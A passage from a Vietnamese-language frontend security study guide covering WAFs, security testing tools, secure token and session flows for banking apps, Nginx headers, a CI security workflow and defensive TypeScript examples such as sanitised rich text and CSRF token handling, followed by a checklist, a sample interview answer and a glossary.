- Chỉ hiện sau hành vi đáng ngờ: nhiều login fail, IP reputation xấu, request rate cao.
- Có fallback accessible.
- Không dùng CAPTCHA để che API không rate limit.

### 3.20. 🛡️ WAF

WAF giúp chặn pattern attack phổ biến trước khi vào app.

Ưu điểm:

- Chặn traffic rõ ràng độc hại.
- Virtual patch khi chưa deploy fix.
- Rate limit/bot protection.

Giới hạn:

- Không hiểu business logic đầy đủ.
- Không thay thế secure coding.
- Có false positive/false negative.

WAF phù hợp để:

- Chặn known exploit patterns.
- Rate limit theo edge.
- Bot mitigation.
- Virtual patch trong lúc chờ deploy fix.

WAF không giải quyết:

- User A xem được account của User B do thiếu authorization.
- Logic transfer sai.
- Token lưu sai ở frontend.
- Secret bị hardcode trong bundle.

### 3.21. 🔍 Security Testing Tools

| Nhóm | Công cụ ví dụ | Bắt lỗi gì |
|---|---|---|
| SAST | Semgrep, CodeQL, ESLint security rules | pattern code nguy hiểm |
| DAST | OWASP ZAP, Burp Suite | lỗi runtime/web endpoint |
| Dependency | npm audit, Snyk, Dependabot, Renovate | vulnerable packages |
| Secret scanning | Gitleaks, GitHub secret scanning | token/secret commit nhầm |
| IaC/container | Trivy, Checkov | image/config/infrastructure risk |
| Browser testing | Playwright security checks | headers, auth flow, redirects |

Chiến lược test hợp lý:

```txt
Local/dev:
  - ESLint/security lint
  - Typecheck
  - Unit tests cho guard/sanitizer wrapper

Pull request:
  - Dependency scan
  - Secret scan
  - Security header tests
  - Auth/permission e2e smoke tests

Scheduled/nightly:
  - DAST scan
  - Full dependency audit
  - Container/IaC scan

Before major release:
  - Threat model review
  - Pen test hoặc focused security review
```

### 3.22. 🎫 Auth Flow an toàn cho banking/trading

Flow khuyến nghị:

```txt
1. User login bằng password/passkey/SSO.
2. Server verify credentials + risk checks.
3. Server set session/refresh cookie: HttpOnly, Secure, SameSite.
4. Frontend gọi API với credentials include.
5. Access token/session ngắn hạn; refresh/rotation server-side.
6. Sensitive action yêu cầu step-up auth/2FA.
7. Logout revoke session server-side và clear cookie.
8. Monitoring detect token reuse, impossible travel, brute force.
```

Access token vs refresh token:

| Token | Lifetime | Storage | Mục tiêu |
|---|---|---|---|
| Access token | Ngắn | Memory hoặc server session | Gọi API |
| Refresh token/session | Dài hơn | `HttpOnly` cookie/server-side | Lấy access mới |
| CSRF token | Theo session/request | readable token tùy pattern | Chống CSRF |

Special cases:

- Multi-tab refresh: dùng single-flight hoặc BroadcastChannel để tránh refresh storm.
- Multiple devices: session list + revoke từng device.
- Logout: revoke server-side, không chỉ xoá client state.
- Token theft detection: refresh token rotation + reuse detection.
- Banking/trading: step-up auth cho transfer/order/withdrawal.

Chi tiết access token vs refresh token:

**Access token**

- Sống ngắn, ví dụ 5-15 phút.
- Scope tối thiểu.
- Nếu bị lộ, thiệt hại bị giới hạn bởi lifetime/scope.
- Không nên dùng làm refresh token.

**Refresh token/session**

- Sống lâu hơn.
- Phải bảo vệ kỹ hơn.
- Rotate sau mỗi lần dùng.
- Nếu token cũ bị dùng lại, coi là dấu hiệu bị đánh cắp và revoke session family.

Flow logout đúng:

```txt
Client click logout
-> POST /logout credentials include
-> Server revoke session/refresh token
-> Server Set-Cookie expire
-> Client clear in-memory state/cache
-> Broadcast logout sang tab khác nếu cần
```

Flow multi-tab:

- Tab A refresh session.
- Tab B/C không nên cùng refresh gây race.
- Dùng single-flight trong từng tab và BroadcastChannel/storage event giữa tabs nếu cần.

Step-up auth examples:

- Chuyển tiền lần đầu tới beneficiary mới.
- Đặt lệnh vượt hạn mức.
- Đổi số điện thoại/email.
- Tắt 2FA.
- Export statement chứa PII.

### 3.23. 📊 Performance vs Security Trade-offs

Security có cost, nhưng bỏ security để nhanh hơn thường là tradeoff sai.

| Technique | Cost | Cách tối ưu đúng |
|---|---|---|
| CSP nonce | Server phải inject nonce per request | Tự động hóa trong framework/middleware |
| DOMPurify | Tăng JS cost nếu bundle sẵn | Lazy-load trước khi render rich text, cache sanitized output |
| CAPTCHA | Tăng friction | Risk-based CAPTCHA thay vì bật mọi request |
| 2FA/step-up | Tăng bước trong flow | Chỉ áp dụng cho action rủi ro |
| Rate limit | Có false positive | Thiết kế limit theo risk và có retry UX |
| Audit logging | Tăng storage/log cost | Log structured, không log secrets/PII thừa |

Benchmark security nên đo:

- Login latency.
- Token refresh failure rate.
- CAPTCHA solve/drop-off rate.
- INP/LCP khi thêm security scripts.
- CSP violation count.
- Rate-limit false positive.

### 3.24. ⚙️ Config mẫu: Nginx headers và GitHub Actions security

Nginx security headers mẫu:

```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
add_header Content-Security-Policy "default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'" always;
```

Lưu ý:

- CSP thực tế cần chỉnh theo CDN/API/font/image/script của app.
- Với nonce/hash, thường set trong app server/framework hơn là Nginx static config.
- Test ở staging với `Report-Only` trước nếu app lớn.

GitHub Actions security baseline:

```yaml
name: Security

on:
  pull_request:
  schedule:
    - cron: "0 2 * * 1"

jobs:
  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npm audit --audit-level=high

  secret-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: gitleaks/gitleaks-action@v2
```

Production CI có thể thêm:

- CodeQL/Semgrep.
- Dependency review.
- Container scan.
- Playwright tests cho security headers/auth redirects.
- SBOM nếu compliance yêu cầu.

## 4. 🧪 Practical TypeScript/JavaScript Examples

### 4.1. ✅ Safe fetch wrapper phân biệt `401` và `403`

```ts
type ApiResult<T> =
  | { ok: true; data: T }
  | { ok: false; status: 401; reason: "unauthenticated" }
  | { ok: false; status: 403; reason: "forbidden" }
  | { ok: false; status: number; reason: "unknown" };

async function apiGet<T>(url: string): Promise<ApiResult<T>> {
  const response = await fetch(url, {
    credentials: "include",
    headers: { Accept: "application/json" },
  });

  if (response.status === 401) {
    return { ok: false, status: 401, reason: "unauthenticated" };
  }

  if (response.status === 403) {
    return { ok: false, status: 403, reason: "forbidden" };
  }

  if (!response.ok) {
    return { ok: false, status: response.status, reason: "unknown" };
  }

  return { ok: true, data: (await response.json()) as T };
}
```

### 4.2. ✅ Single-flight token refresh

```ts
let refreshPromise: Promise<void> | null = null;

async function refreshSessionOnce() {
  if (!refreshPromise) {
    refreshPromise = fetch("/api/auth/refresh", {
      method: "POST",
      credentials: "include",
    })
      .then((response) => {
        if (!response.ok) throw new Error("Refresh failed");
      })
      .finally(() => {
        refreshPromise = null;
      });
  }

  return refreshPromise;
}
```

### 4.3. ✅ Sanitized rich text component

```tsx
type RichTextProps = {
  html: string;
};

function RichText({ html }: RichTextProps) {
  const [safeHtml, setSafeHtml] = React.useState("");

  React.useEffect(() => {
    let cancelled = false;

    import("dompurify").then(({ default: DOMPurify }) => {
      if (!cancelled) {
        setSafeHtml(DOMPurify.sanitize(html));
      }
    });

    return () => {
      cancelled = true;
    };
  }, [html]);

  return <div dangerouslySetInnerHTML={{ __html: safeHtml }} />;
}
```

### 4.4. ✅ CSRF token bootstrap

```tsx
function useCsrfToken() {
  const [token, setToken] = React.useState<string | null>(null);

  React.useEffect(() => {
    fetch("/api/csrf", { credentials: "include" })
      .then((response) => response.json())
      .then((data: { csrfToken: string }) => setToken(data.csrfToken));
  }, []);

  return token;
}
```

### 4.5. ✅ File upload validation phía client chỉ để UX

```ts
const allowedTypes = new Set(["image/png", "image/jpeg", "application/pdf"]);
const maxSize = 5 * 1024 * 1024;

function validateFileForUx(file: File) {
  if (!allowedTypes.has(file.type)) {
    return "File type is not allowed";
  }

  if (file.size > maxSize) {
    return "File is too large";
  }

  return null;
}
```

> ⚠️ Client validation chỉ giúp báo lỗi sớm. Server vẫn phải validate MIME/magic bytes/size và scan nếu cần.

### 4.6. ✅ Security header check trong Playwright

```ts
import { expect, test } from "@playwright/test";

test("security headers are present", async ({ request }) => {
  const response = await request.get("/");
  const headers = response.headers();

  expect(headers["content-security-policy"]).toBeTruthy();
  expect(headers["x-content-type-options"]).toBe("nosniff");
  expect(headers["strict-transport-security"]).toContain("max-age");
});
```

## 5. 🏭 Production Notes / React Implications

- ⚛️ **React escaping:** JSX text interpolation an toàn hơn raw HTML, nhưng `dangerouslySetInnerHTML` cần sanitizer.
- 🔐 **Auth state:** UI auth state chỉ là cache. API phải trả `401/403` đúng và frontend handle rõ.
- 🧭 **Route guards:** Frontend route guard tốt cho UX, không phải authorization boundary.
- 🧾 **SSR/Next.js:** Không leak secrets vào client bundle, props, HTML, source maps hoặc logs.
- 🍪 **Cookies:** Với cross-site auth cần hiểu `SameSite=None; Secure`, CORS credentials và CSRF impact.
- 📦 **Dependencies:** Lockfile, dependency updates, SRI/CDN policy và bundle review là security work.
- 🚀 **Performance:** CSP, sanitizer, CAPTCHA, crypto, risk checks có cost; đo nhưng không bỏ defense chính.
- 🧪 **Testing:** Kết hợp unit tests cho guards, e2e auth flow, DAST, dependency scan, header checks.
- ♿ **CAPTCHA/2FA:** Security UX phải accessible; cung cấp recovery/backup codes.
- 📊 **Monitoring:** Log security events có structured fields, nhưng không log secrets/PII nhạy cảm.

## 6. ⚠️ Common Pitfalls

- ❌ Lưu access/refresh token trong `localStorage` cho app nhạy cảm.
- ❌ Tin role/permission từ client.
- ❌ Chỉ validate form ở frontend.
- ❌ Dùng `dangerouslySetInnerHTML` không sanitize.
- ❌ CSP dùng `unsafe-inline` lâu dài.
- ❌ Cookie auth thiếu `HttpOnly`, `Secure`, `SameSite`.
- ❌ CORS `Access-Control-Allow-Origin: *` với credentials.
- ❌ Hardcode API keys/secrets trong frontend.
- ❌ Không rate limit login/OTP/password reset.
- ❌ Không revoke refresh token khi logout.
- ❌ Không detect refresh token reuse.
- ❌ File upload chỉ check extension.
- ❌ OAuth thiếu `state`/PKCE/nonce.
- ❌ Không rotate secrets khi lộ.
- ❌ Không scan dependencies.
- ❌ Không có audit log cho action nhạy cảm.
- ❌ Security checklist có nhưng không được enforce trong CI/review.

## 7. ✅ Decision Guide / Checklist

### Chọn kỹ thuật nào?

| Tình huống | Chọn | Lý do |
|---|---|---|
| Auth session web app nhạy cảm | `HttpOnly Secure SameSite` cookie | Giảm token theft qua JS |
| SPA cần gọi API | Cookie session/BFF hoặc memory access token | Tránh persistent token trong JS-readable storage |
| Render rich text | DOMPurify/sanitizer + CSP | React escape không áp dụng với raw HTML |
| Chống CSRF | SameSite + CSRF token + Origin/Fetch Metadata | Cookie tự gửi theo request |
| CDN script | SRI + CSP allowlist | Giảm supply-chain tampering |
| Feature public form bị spam | Rate limit + CAPTCHA/risk scoring | CAPTCHA một mình không đủ |
| Upload file | Server validation + scan + private storage | Client validation không đáng tin |
| Sensitive action | Step-up auth/2FA | Giảm rủi ro session bị chiếm |
| OAuth login | Authorization Code + PKCE + state + nonce | Flow chuẩn cho public clients |
| Production monitoring | Audit log + alert + SIEM/dashboard | Phát hiện incident sớm |

### Checklist production

| Câu hỏi | Trả lời ngắn |
|---|---|
| App có HTTPS + HSTS chưa? | Cần cho production, tránh mixed content. |
| Token/session lưu ở đâu? | Ưu tiên `HttpOnly Secure SameSite` cookie cho app nhạy cảm. |
| API có enforce authorization không? | Bắt buộc; frontend guard chỉ là UX. |
| XSS đã có nhiều lớp phòng thủ chưa? | Escape, sanitize, CSP, tránh eval/unsafe HTML. |
| CSRF đã xử lý chưa? | Cần nếu dùng cookie auth cho state-changing requests. |
| Security headers đã bật chưa? | CSP, HSTS, nosniff, frame-ancestors, referrer/permissions policy. |
| CORS có allowlist không? | Không dùng wildcard với credentials. |
| Dependencies có được scan/update không? | Cần CI scan và update định kỳ. |
| File upload có validate server-side không? | Bắt buộc validate type/size/content và storage an toàn. |
| Login/OTP có rate limit không? | Cần chống brute force và abuse. |
| Secrets có nằm trong frontend bundle không? | Không được; secrets chỉ ở server/infra. |
| Có logging/monitoring security events không? | Cần để detect và investigate incident. |
| Có test security tự động không? | Header tests, dependency scan, SAST/DAST tùy risk. |

## 8. 🗣️ Short Interview Answer

Theo em, frontend security nên bắt đầu từ tư duy defense in depth. Em không xem frontend là boundary cuối cùng, vì client có thể bị sửa và request có thể bị giả lập. Frontend cần làm tốt phần giảm rủi ro như tránh XSS, không lưu token nhạy cảm trong `localStorage`, dùng cookie `HttpOnly/Secure/SameSite` khi phù hợp, set security headers, handle auth state rõ ràng, và không leak secrets vào bundle.

Với auth, em tách rõ authentication và authorization. UI có thể ẩn button theo role để UX tốt hơn, nhưng API vẫn phải enforce quyền theo từng resource. Nếu dùng cookie auth thì phải nghĩ tới CSRF bằng `SameSite`, CSRF token, Origin/Fetch Metadata checks. Nếu render rich text thì phải sanitize và có CSP. Với hệ thống nhạy cảm như banking/trading, em sẽ dùng token ngắn hạn, refresh rotation, 2FA/step-up auth cho action rủi ro, rate limit, audit log và monitoring.

Điểm senior là không chỉ liệt kê checklist, mà biết tradeoff và biết triển khai theo phase: fix critical risks trước, sau đó tăng CSP/headers/dependency scanning, rồi monitoring/compliance. Security phải được enforce trong code review, CI/CD và observability, không phải tài liệu để đó.

## 9. 📖 Giải thích các thuật ngữ trong topic

- `Defense in Depth`: Phòng thủ nhiều lớp để một lớp hỏng vẫn còn lớp khác giảm thiệt hại.
- `HTTPS`: HTTP qua TLS, bảo vệ dữ liệu khi truyền.
- `TLS`: Giao thức mã hóa kết nối mạng.
- `XSS`: Cross-Site Scripting, attacker chạy JavaScript độc hại trong trang.
- `CSRF`: Cross-Site Request Forgery, attacker lợi dụng browser tự gửi cookie.
- `CSP`: Content Security Policy, header giới hạn nguồn script/style/resource được load.
- `Nonce`: Giá trị random dùng một lần, thường dùng trong CSP cho inline script hợp lệ.
- `HttpOnly`: Cookie flag khiến JavaScript không đọc được cookie.
- `Secure`: Cookie flag chỉ gửi qua HTTPS.
- `SameSite`: Cookie flag kiểm soát cookie có gửi trong cross-site request không.
- `AuthN`: Authentication, xác thực user là ai.
- `AuthZ`: Authorization, phân quyền user được làm gì.
- `Access token`: Token ngắn hạn dùng gọi API.
- `Refresh token`: Token dài hạn hơn dùng lấy access token mới.
- `Token rotation`: Cấp refresh token mới mỗi lần refresh và vô hiệu hóa token cũ.
- `BFF`: Backend for Frontend, backend trung gian giúp frontend không giữ token nhạy cảm.
- `CORS`: Cơ chế browser kiểm soát cross-origin requests.
- `SRI`: Subresource Integrity, kiểm tra hash của script/style từ CDN.
- `SSRF`: Server-Side Request Forgery, ép server gọi URL ngoài ý muốn.
- `WAF`: Web Application Firewall, lớp lọc/chặn traffic độc hại.
- `CAPTCHA`: Challenge phân biệt bot/người, dùng giảm abuse.
- `2FA/MFA`: Xác thực nhiều yếu tố.
- `TOTP`: Time-based One-Time Password trong authenticator app.
- `WebAuthn`: Chuẩn xác thực mạnh bằng passkey/security key.
- `PKCE`: Proof Key for Code Exchange, bảo vệ OAuth public clients.
- `OIDC`: OpenID Connect, identity layer trên OAuth 2.0.
- `Rate limiting`: Giới hạn tần suất request.
- `Audit log`: Log phục vụ truy vết hành động nhạy cảm.
- `SAST`: Static Application Security Testing, phân tích source code.
- `DAST`: Dynamic Application Security Testing, test app đang chạy.
- `Dependency scanning`: Quét package/library có lỗ hổng.
- `Secret scanning`: Quét token/secret bị commit nhầm.
- `OWASP Top 10`: Danh sách rủi ro web app phổ biến/nghiêm trọng do OWASP duy trì.

## 10. 📚 Tài liệu tham khảo chính

- OWASP Top 10 2021: <https://owasp.org/Top10/2021/>
- OWASP XSS Prevention Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP CSRF Prevention Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html>
- MDN Secure Cookie Configuration: <https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Cookies>
- MDN Content-Security-Policy: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy>
- MDN Subresource Integrity: <https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity>
